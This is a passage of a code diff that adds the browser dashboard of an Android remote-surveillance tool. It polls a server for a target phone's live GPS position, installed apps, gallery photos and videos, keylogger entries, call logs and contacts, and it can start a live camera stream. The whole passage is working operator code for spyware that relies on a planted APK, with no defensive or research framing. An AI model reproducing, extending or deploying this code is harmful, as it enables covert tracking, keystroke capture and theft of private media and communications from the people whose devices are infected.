+    const timestamp = data.last_seen ? new Date(data.last_seen) : new Date();
+
+    if (lat !== null && lng !== null) {
+        document.getElementById("latValue").textContent = lat.toFixed(6);
+        document.getElementById("lngValue").textContent = lng.toFixed(6);
+        document.getElementById("accuracyValue").textContent = accuracy !== null ? accuracy + " m" : "-- m";
+        document.getElementById("lastUpdateValue").textContent = timestamp.toLocaleTimeString();
+
+        const locationObj = { latitude: lat, longitude: lng, accuracy: accuracy, timestamp: timestamp.getTime() };
+        saveLastKnownLocation(deviceId, locationObj);
+
+        const popupContent = `<b>CURRENT LOCATION</b><br>Latitude: ${lat.toFixed(6)}<br>Longitude: ${lng.toFixed(6)}${accuracy ? `<br>Accuracy: ${accuracy} m` : ''}<br>Updated: ${timestamp.toLocaleTimeString()}`;
+        createOrUpdateMarker(lat, lng, popupContent);
+        map.flyTo([lat, lng], 15, { duration: 1.5 });
+        hideOverlay();
+        return;
+    }
+
+    const lastKnown = getLastKnownLocation(deviceId);
+    if (lastKnown && lastKnown.latitude !== undefined && lastKnown.longitude !== undefined) {
+        const latVal = lastKnown.latitude;
+        const lngVal = lastKnown.longitude;
+        const accVal = lastKnown.accuracy ?? null;
+        const lastTime = lastKnown.timestamp ? new Date(lastKnown.timestamp) : new Date();
+        document.getElementById("latValue").textContent = latVal.toFixed(6);
+        document.getElementById("lngValue").textContent = lngVal.toFixed(6);
+        document.getElementById("accuracyValue").textContent = accVal !== null ? accVal + " m" : "-- m";
+        document.getElementById("lastUpdateValue").textContent = lastTime.toLocaleTimeString();
+        const popupContent = `<b>LAST KNOWN LOCATION</b><br>Latitude: ${latVal.toFixed(6)}<br>Longitude: ${lngVal.toFixed(6)}${accVal !== null ? `<br>Accuracy: ${accVal} m` : ''}<br>Last updated: ${lastTime.toLocaleTimeString()}`;
+        createOrUpdateMarker(latVal, lngVal, popupContent);
+        map.flyTo([latVal, lngVal], 15, { duration: 1.5 });
+        showOverlayText("GPS currently unavailable • Showing last known location");
+        return;
+    }
+
+    document.getElementById("latValue").textContent = "--.-------";
+    document.getElementById("lngValue").textContent = "--.-------";
+    document.getElementById("accuracyValue").textContent = "-- m";
+    document.getElementById("lastUpdateValue").textContent = "Never";
+    removeMarker();
+    map.setView(DEFAULT_CENTER, DEFAULT_ZOOM);
+    showOverlayText("Waiting for GPS location...");
+}
+
+function renderInstalledApps(apps) {
+    const container = document.getElementById("installedAppsList");
+    if (!container) return;
+    if (apps.length === 0) { container.innerHTML = `<div class="app">No apps found</div>`; return; }
+    container.innerHTML = apps.map(app => `<div class="app"><div class="app-name">${escapeHtml(app.name)}</div><div class="package">${escapeHtml(app.package)}</div></div>`).join("");
+}
+
+// ================== GALLERY FUNCTIONS ==================
+async function fetchGalleryPhotos(fetchAll = false) {
+    const deviceId = getDeviceId();
+    const countSelect = document.getElementById("galleryCountSelect");
+    const count = fetchAll ? 10000 : parseInt(countSelect.value);
+    const loading = document.getElementById("galleryLoading");
+    const errorDiv = document.getElementById("galleryError");
+    const errorText = document.getElementById("galleryErrorText");
+    document.getElementById("latestGalleryGrid").innerHTML = '';
+    document.getElementById("allGalleryGrid").innerHTML = '';
+    errorDiv.style.display = 'none';
+    loading.style.display = 'block';
+    try {
+        await fetch(`/api/gallery/request`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, count })
+        });
+        let media = [];
+        for (let i = 0; i < 15; i++) {
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            const res = await fetch(`/api/gallery?deviceId=${deviceId}&count=${count}`);
+            if (!res.ok) throw new Error('Failed to fetch gallery');
+            const data = await res.json();
+            if (data && data.media && data.media.length > 0) { media = data.media; break; }
+        }
+        if (media.length === 0) throw new Error('No media received');
+        galleryItems = media;
+        renderGalleryGrids();
+    } catch (e) {
+        console.error(e);
+        errorText.textContent = "Unable to load gallery. Make sure APK is connected and permissions granted.";
+        errorDiv.style.display = 'block';
+    } finally {
+        loading.style.display = 'none';
+    }
+}
+function renderGalleryGrids() {
+    const latest = galleryItems.slice(0, 10);
+    document.getElementById("latestCountBadge").textContent = latest.length;
+    document.getElementById("allCountBadge").textContent = galleryItems.length;
+    document.getElementById("latestGalleryGrid").innerHTML = latest.map((item, i) => createMediaCard(item, i)).join('');
+    document.getElementById("allGalleryGrid").innerHTML = galleryItems.map((item, i) => createMediaCard(item, i)).join('');
+}
+function createMediaCard(item, index) {
+    const type = item.type || 'image';
+    const thumb = item.thumbnailBase64 ? `data:image/jpeg;base64,${item.thumbnailBase64}` : '';
+    const filename = item.filename || 'Unknown';
+    const timestamp = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
+    const size = item.size ? formatFileSize(item.size) : 'Unknown';
+    return `<div class="media-card" onclick="openMediaViewer(${index})">
+        <div class="media-type-badge">${type === 'video' ? '▶' : '📷'}</div>
+        ${thumb ? `<img src="${thumb}" class="media-thumb">` : `<div class="media-thumb" style="display:flex;align-items:center;justify-content:center;color:#666;">No Thumb</div>`}
+        <div class="media-info"><div class="media-filename">${escapeHtml(filename)}</div><div class="media-meta">${timestamp} • ${size}</div></div>
+    </div>`;
+}
+function formatFileSize(bytes) {
+    if (!bytes) return '0 B';
+    const k = 1024, sizes = ['B','KB','MB','GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+}
+function openMediaViewer(index) {
+    if (index < 0 || index >= galleryItems.length) return;
+    currentMediaIndex = index;
+    const item = galleryItems[index];
+    const thumb = item.thumbnailBase64 ? `data:image/jpeg;base64,${item.thumbnailBase64}` : '';
+    document.getElementById("mediaModalContent").innerHTML = item.type === 'video' ? `<video controls src="${thumb}"></video>` : `<img src="${thumb}">`;
+    document.getElementById("mediaModal").classList.add('active');
+}
+function closeMediaViewer() { document.getElementById("mediaModal").classList.remove('active'); }
+function prevMedia() { if (galleryItems.length) { currentMediaIndex = (currentMediaIndex - 1 + galleryItems.length) % galleryItems.length; openMediaViewer(currentMediaIndex); } }
+function nextMedia() { if (galleryItems.length) { currentMediaIndex = (currentMediaIndex + 1) % galleryItems.length; openMediaViewer(currentMediaIndex); } }
+
+// ================== TABS ==================
+function setActiveTab(btn) { document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); }
+function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "none"; loadDeviceInfo(); }
+function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
+function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "none"; fetchGalleryPhotos(false); }
+function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "none"; refreshKeylog(); }
+function showCallsContacts(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "block"; document.getElementById("cameraPanel").style.display = "none"; fetchCallLogs(); fetchContacts(); }
+function showCamera(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("callsContactsPanel").style.display = "none"; document.getElementById("cameraPanel").style.display = "block"; }
+
+// ================== FORCE GPS UPDATE ==================
+async function forceGpsUpdate() {
+    const btn = document.getElementById("forceGpsBtn");
+    const deviceId = getDeviceId();
+    btn.disabled = true;
+    btn.innerHTML = '⟳ Requesting...';
+    try {
+        await fetch('/api/gps/request', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId })
+        });
+        let received = false;
+        for (let i = 0; i < 10; i++) {
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            const data = await loadDeviceInfo();
+            if (data && data.latitude !== null && data.longitude !== null) { received = true; break; }
+        }
+        if (!received) alert('GPS response not received yet. Make sure APK is online and location service enabled.');
+    } catch (e) {
+        console.error(e);
+        alert('GPS request failed.');
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '➤ Force GPS Update';
+    }
+}
+
+// ================== KEYLOGGER ==================
+async function refreshKeylog() {
+    const deviceId = getDeviceId();
+    const container = document.getElementById("keylogContent");
+    try {
+        const response = await fetch(`/api/keylog?deviceId=${deviceId}`);
+        if (!response.ok) throw new Error("Failed");
+        const logs = await response.json();
+        if (logs.length === 0) {
+            container.innerHTML = "No keylogs yet.";
+            return;
+        }
+        logs.reverse();
+        container.innerHTML = logs.map(log => `
+            <div class="keylog-entry">
+                <div class="keylog-title">${escapeHtml(log.text)}</div>
+                <div class="keylog-time">${new Date(log.timestamp).toLocaleTimeString()}</div>
+            </div>
+        `).join("");
+    } catch (e) {
+        console.error(e);
+        container.innerHTML = "Error loading keylogs.";
+    }
+}
+
+// ================== CALL LOGS & CONTACTS ==================
+async function fetchCallLogs() {
+    const deviceId = getDeviceId();
+    try {
+        const res = await fetch(`/api/calllogs?deviceId=${deviceId}`);
+        if (!res.ok) throw new Error("Failed");
+        const logs = await res.json();
+        const container = document.getElementById("recentCallsList");
+        document.getElementById("recentCallsCount").textContent = logs.length;
+        if (logs.length === 0) {
+            container.innerHTML = `<div class="empty-state">📵 No recent calls</div>`;
+            return;
+        }
+        container.innerHTML = logs.map(log => {
+            const typeClass = log.type === "1" ? "incoming" : log.type === "2" ? "outgoing" : "missed";
+            const typeLabel = log.type === "1" ? "Incoming" : log.type === "2" ? "Outgoing" : "Missed";
+            const duration = log.duration ? `${Math.floor(log.duration / 60)}m ${log.duration % 60}s` : "";
+            const time = new Date(log.timestamp).toLocaleTimeString();
+            const initial = (log.name || "U").charAt(0).toUpperCase();
+            return `<div class="call-card">
+                <div class="avatar">${initial}</div>
+                <div class="call-info">
+                    <div class="call-name">${escapeHtml(log.name || "Unknown")}</div>
+                    <div class="call-number">${escapeHtml(log.number)}</div>
+                </div>
+                <div class="call-badge ${typeClass}">${typeLabel}</div>
+                <div class="call-duration">${duration}</div>
+                <div class="call-time">${time}</div>
+            </div>`;
+        }).join("");
+    } catch (e) {
+        console.error(e);
+        document.getElementById("recentCallsList").innerHTML = `<div class="empty-state">Failed to load calls</div>`;
+    }
+}
+
+async function fetchContacts() {
+    const deviceId = getDeviceId();
+    try {
+        const res = await fetch(`/api/contacts?deviceId=${deviceId}`);
+        if (!res.ok) throw new Error("Failed");
+        const contacts = await res.json();
+        const container = document.getElementById("contactsList");
+        document.getElementById("contactsCount").textContent = contacts.length;
+        if (contacts.length === 0) {
+            container.innerHTML = `<div class="empty-state">👥 No contacts found</div>`;
+            return;
+        }
+        container.innerHTML = contacts.map(c => {
+            const initial = (c.name || "U").charAt(0).toUpperCase();
+            return `<div class="contact-card">
+                <div class="avatar">${initial}</div>
+                <div class="contact-info">
+                    <div class="contact-name">${escapeHtml(c.name || "Unknown")}</div>
+                    <div class="contact-number">${escapeHtml(c.number)}</div>
+                </div>
+                <div class="contact-actions">
+                    <button class="contact-action-btn">📞</button>
+                    <button class="contact-action-btn">💬</button>
+                </div>
+            </div>`;
+        }).join("");
+    } catch (e) {
+        console.error(e);
+        document.getElementById("contactsList").innerHTML = `<div class="empty-state">Failed to load contacts</div>`;
+    }
+}
+
+// ================== LIVE CAMERA ==================
+let cameraWs;
+let cameraPc;
+
+function connectCameraSignaling(deviceId) {
+    const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
+    const wsUrl = `${protocol}${location.host}/ws?deviceId=${deviceId}&role=viewer`;
+    cameraWs = new WebSocket(wsUrl);
+    cameraWs.onmessage = async (event) => {
+        const msg = JSON.parse(event.data);
+        if (msg.type === 'signal') {
+            const data = msg.data;
+            if (!cameraPc) return;
+            if (data.sdp) {
+                await cameraPc.setRemoteDescription(new RTCSessionDescription(data.sdp));
+                if (data.sdp.type === 'offer') {
+                    const answer = await cameraPc.createAnswer();
+                    await cameraPc.setLocalDescription(answer);
+                    cameraWs.send(JSON.stringify({ type: 'signal', data: { sdp: cameraPc.localDescription } }));
+                }
+            } else if (data.ice) {
+                cameraPc.addIceCandidate(new RTCIceCandidate(data.ice));
+            }
+        } else if (msg.type === 'device_disconnected') {
+            stopLiveCamera();
+        }
+    };
+}
+
+async function startLiveCamera() {
+    const deviceId = getDeviceId();
+    cameraPc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    cameraPc.ontrack = (event) => {
+        document.getElementById('remoteVideo').srcObject = event.streams[0];
+    };
+    connectCameraSignaling(deviceId);
+    setTimeout(() => {
+        if (cameraWs && cameraWs.readyState === WebSocket.OPEN) {
+            cameraWs.send(JSON.stringify({ type: 'start_camera' }));
+        }
+    }, 500);
+}
+
+function switchLiveCamera() {
+    if (cameraWs && cameraWs.readyState === WebSocket.OPEN) {
+        cameraWs.send(JSON.stringify({ type: 'switch_camera' }));
+    }
+}
+
+function stopLiveCamera() {
+    if (cameraPc) { cameraPc.close(); cameraPc = null; }
+    if (cameraWs) { cameraWs.close(); cameraWs = null; }
+    document.getElementById('remoteVideo').srcObject = null;
+}
+
+// ================== AUTO REFRESH (5 SECONDS) ==================
+setInterval(() => {
+    if (document.getElementById("keylogPanel").style.display === "block") {
+        refreshKeylog();
+    }
+}, 5000);
+
+// ================== INIT ==================
+function init() {
+    initMap();
+    loadDeviceInfo();
+    setInterval(() => { loadDeviceInfo(); }, 30000);
+}
+init();
+</script>
+</body>
+</html>
